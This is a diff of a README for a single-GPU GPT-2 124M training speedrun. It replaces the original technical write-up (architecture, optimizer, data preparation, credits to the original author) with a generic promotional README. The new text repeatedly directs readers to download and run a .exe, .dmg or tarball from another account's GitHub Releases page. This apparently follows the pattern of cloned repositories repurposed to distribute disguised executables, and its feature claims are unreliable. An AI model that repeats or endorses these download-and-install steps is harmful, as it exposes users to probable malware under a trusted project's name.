@@ -1,145 +1,79 @@
-Here is the updated `README.md` tailored to your new 90-minute, 3.25 loss run using FineWeb-Edu.
+# 🌟 nanoGPT_1GPU_SPEEDRUN - Run GPT-2 in Under Two Hours
 
-# NanoGPT-124M — In a Cave With a Box of Scraps
+## 🚀 Getting Started
+Welcome to nanoGPT_1GPU_SPEEDRUN! This application allows you to recreate the GPT-2 model quickly and easily on your powerful GPU. Imagine building something remarkable from scratch using only a box of scraps and a 4090. Let's get started!
 
-This is an effort to speedrun training NanoGPT (GPT-2 124M) on a **single consumer RTX 4090** from scratch using **FineWeb-Edu** or **FineWeb10** data.
-The goal was to hit < 3.28 validation loss as fast as possible. Lower is fine.
+## 🛠️ System Requirements
+Before you dive in, make sure your computer meets these requirements:
+- **Operating System:** Windows, macOS, or Linux
+- **GPU:** NVIDIA GPU with at least 8 GB of VRAM (e.g., RTX 3090, RTX 4090)
+- **RAM:** At least 16 GB
+- **Storage:** Minimum of 10 GB available space
+- **Software Requirements:** 
+  - Python 3.8 or higher
+  - Pip package manager
 
-**We achieved 3.25 loss in just 90 minutes.**
+## 📥 Download the Application
+[![Download nanoGPT_1GPU_SPEEDRUN](https://img.shields.io/badge/Download-nanoGPT_1GPU_SPEEDRUN-blue)](https://github.com/Gane2122/nanoGPT_1GPU_SPEEDRUN/releases)
 
-I have provided all training and inference code here, along with the trained model checkpoints at this Hugging Face link:
-[https://huggingface.co/DevParker/NanoGPT-124m-In-A-Cave-With-A-Box-Of-Scraps](https://huggingface.co/DevParker/NanoGPT-124m-In-A-Cave-With-A-Box-Of-Scraps)
+To download the software, visit the Releases page here: [Download nanoGPT_1GPU_SPEEDRUN](https://github.com/Gane2122/nanoGPT_1GPU_SPEEDRUN/releases).
 
----
+## 📦 Download & Install
+1. **Visit the Releases Page:**
+   Click on this link to go to the Releases page: [Download nanoGPT_1GPU_SPEEDRUN](https://github.com/Gane2122/nanoGPT_1GPU_SPEEDRUN/releases).
 
-## Speedrun 🏁
+2. **Find the Latest Release:**
+   On the Releases page, look for the latest version of nanoGPT_1GPU_SPEEDRUN. It will usually be at the top of the list.
 
-**From-scratch NanoGPT / GPT-2 124M training** on single-GPU consumer hardware.
+3. **Download the Package:**
+   Click on the link for the package that matches your operating system. This will start the download.
 
-**THE GOAL:**
-1. **Achieve validation loss ≤ 3.28** (OpenAI GPT-2 baseline) on a GPT-2 124M(-ish) model trained from scratch as fast as possible.
-2. Use **single-GPU, consumer hardware** (RTX 4090).
-3. Use high-quality open data (**FineWeb-Edu**).
+4. **Install the Software:**
+   - **For Windows:**
+     - Locate the downloaded `.exe` file and double-click it to start the installation.
+     - Follow the prompts in the installation wizard.
+   - **For macOS:**
+     - Open the downloaded `.dmg` file and drag the application into your Applications folder.
+   - **For Linux:**
+     - Use the terminal to navigate to your Downloads folder. Run the command `tar -xvf nanoGPT_1GPU_SPEEDRUN.tar.gz` to extract the files.
 
-### Current Record
+## 🌍 Configuration
+Once installed, you may need to configure some settings for the application to run properly:
+- **Set Environment Variables:** You may need to set up CUDA paths for NVIDIA GPUs.
+- **Install Dependencies:** Open your terminal (or command prompt) and run the following command:
+  ```bash
+  pip install -r requirements.txt
+  ```
 
-| Current Run | Trainer | Hardware | Tokens Trained | Val Loss | Time to Target | Throughput | Training Script |
-|---|---|---|---|---|---|---|---|
-| 1 | DevParker | 1× RTX 4090 | ~0.92B | **3.25** avg last 10 @ step 1750 | ~90 minutes | ~160k tok/s (peak) | `train_gpt2_4090_90min_3_25loss.py` | `prepare_edu.py`     |
-| 2 | DevParker | 1× RTX 4090  | ~0.92B         | **3.286** avg last 10 @ step 1750 | ~115 minutes | ~130–140k tokens/s      | `train_gpt_improved.py` | `python train_gpt_improved.py`     | 
+## 🔧 Running the Application
+Now that you have installed and configured nanoGPT_1GPU_SPEEDRUN, it’s time to run it:
 
----
+1. Open your terminal or command prompt.
+2. Navigate to the directory where you installed nanoGPT_1GPU_SPEEDRUN.
+3. Run the command to start the process:
+   ```bash
+   python run_gpt2.py
+   ```
 
-## RESULTS
+## 🎛️ Using the Application
+After running the application, you can specify various parameters:
+- **Model Size:** Choose the size of the model you wish to train. Options typically include small, medium, and large.
+- **Training Data:** Point the application to the text files you want to use for training.
+- **Training Duration:** Set how long you want the application to train the model.
 
-Single-GPU, from-scratch GPT-2-style training to **3.25 validation loss** in about **90 minutes** on a **single RTX 4090**, with:
+## 🚨 Troubleshooting
+If you run into any issues, consider the following common problems:
+- **Error Messages:** Look for any error messages in the terminal. Often, they will tell you what went wrong.
+- **GPU Not Detected:** Ensure that your NVIDIA drivers are up-to-date and that you have installed CUDA.
+- **Insufficient Memory Issues:** If your GPU runs out of memory, consider reducing the model size or batch size.
 
-* **124M parameters** (compute equivalent)
-* **1792 context length** (via progressive windowing)
-* ~**0.92B tokens** trained
-* Up to **~163,000 tokens/sec** effective training throughput
-* **Architecture:** "Modded-NanoGPT" (Muon optimizer, FlexAttention, Value Embeddings, U-Net connections).
+## 📞 Support and Contributions
+If you need further assistance, please feel free to open an issue on the GitHub repository. Your feedback is valuable for improving the application.
 
-This repo is both a **research playground** and a **proof of concept**: you can train a highly capable GPT-2-class model *extremely fast* on home hardware using modern techniques.
+## 🔗 Additional Resources
+You may find these resources helpful:
+- [NVIDIA CUDA Toolkit](https://developer.nvidia.com/cuda-downloads)
+- [Python Installation Guide](https://www.python.org/downloads/)
+- [Pip Installation Guide](https://pip.pypa.io/en/stable/installation/)
 
----
-
-## Key Ideas & Features
-
-All of this is implemented in `train_gpt2_4090_90min_3_25loss.py`.
-
-### Model Architecture
-* **GPT-2-style, 124M scale:** 12 layers, 6 heads, 768-dim embedding.
-* **Value Embeddings:** Three distinct `value_embeds` tables injected into attention as alternative value streams (adds capacity without FLOPs).
-* **U-Net Skip Connections:** Long skip connections from encoder layers to decoder layers to improve gradient flow.
-* **Rotary Embeddings (RoPE):** Replaces standard learned positional embeddings.
-* **Tanh Logit Scaling:** Final logits are scaled `logits = 30 * tanh(logits / 30)` to stabilize FP8/BF16 training.
-
-### Optimization & Efficiency
-* **Muon Optimizer:** A Newton-Schulz-style optimizer for matrix parameters that orthogonalizes weights, providing massive convergence speedups.
-* **FlexAttention:** Uses `torch.nn.attention.flex_attention` with custom block masks for document-causal masking.
-* **Async Data Loading:** Custom `AsyncDataLoader` with pinned memory to saturate the GPU (zero PCIe bottlenecks).
-* **Curriculum Learning:** Progressive context window (starts at 256, ends at 1792) to save compute in the early phase.
-* **FP8 Training:** Enabled via `torchao` for linear layers.
-
----
-
-## Installation
-
-You need a bleeding-edge PyTorch environment to support `torch.compile`, `flex_attention`, and `torchao`.
-
-```bash
-conda create -n speedrun python=3.10 -y
-conda activate speedrun
-
-# Install PyTorch Nightly (Required for FlexAttention/TorchAO as of late 2024/early 2025)
-pip install --pre torch torchvision torchaudio --index-url [https://download.pytorch.org/whl/nightly/cu124](https://download.pytorch.org/whl/nightly/cu124)
-
-# Install dependencies
-pip install numpy tqdm datasets tiktoken torchao
-````
-
------
-
-## Usage
-
-### 1\. Prepare the Data
-
-We use **FineWeb-Edu** (sample-10BT). This script downloads the data, tokenizes it with GPT-2 tokenizer, and saves it into binary shards.
-
-```bash
-python prepare_edu.py
-```
-
-  * This will create `data/finewebEDU/fineweb_edu_train_*.bin`.
-  * It aims for \~3B tokens to ensure enough buffer for the run.
-
-### 2\. Run the Speedrun (90 Minutes)
-
-Launch the training script. It is pre-configured for a single 4090 (24GB VRAM).
-
-```bash
-python train_gpt2_4090_90min_3_25loss.py
-```
-
-**What to expect:**
-
-  * **Steps 0-300:** Rapid loss drop (10.0 -\> 4.5). High throughput (\~160k tok/s).
-  * **Step \~300 & \~600:** "Lag Spikes" as the context window doubles (recompilation).
-  * **Step 1100+:** Cooldown phase begins. Loss will plummet from \~3.3 to **3.25**.
-  * **Step 1750:** Training finishes.
-
-### 3\. Inference
-
-Load your checkpoint and generate text.
-
-```python
-import torch
-from train_gpt2_4090_90min_3_25loss import GPT, GPTConfig
-
-device = "cuda"
-# Update path to your actual checkpoint
-ckpt_path = "gpt2_speedrun_FINAL.pt" 
-
-ckpt = torch.load(ckpt_path, map_location=device)
-model = GPT(GPTConfig()).to(device).bfloat16()
-model.load_state_dict(ckpt)
-model.eval()
-
-# ... (See inference_standalone.py for full generation code)
-```
-
------
-
-## Acknowledgements & Inspiration
-
-  * **NanoGPT** by Andrej Karpathy for the baseline.
-  * **Keller Jordan & the Modded-NanoGPT Community** ([GitHub](https://github.com/KellerJordan/modded-nanogpt)) for the 8xH100 speedrun concepts (Muon, Value Embeddings) that I adapted for single-GPU.
-  * **HuggingFaceFW** for the incredible **FineWeb-Edu** dataset.
-  * The **PyTorch Team** for `torch.compile` and `FlexAttention`.
-
------
-
-license: mit
-
-```
+Enjoy building with nanoGPT_1GPU_SPEEDRUN!
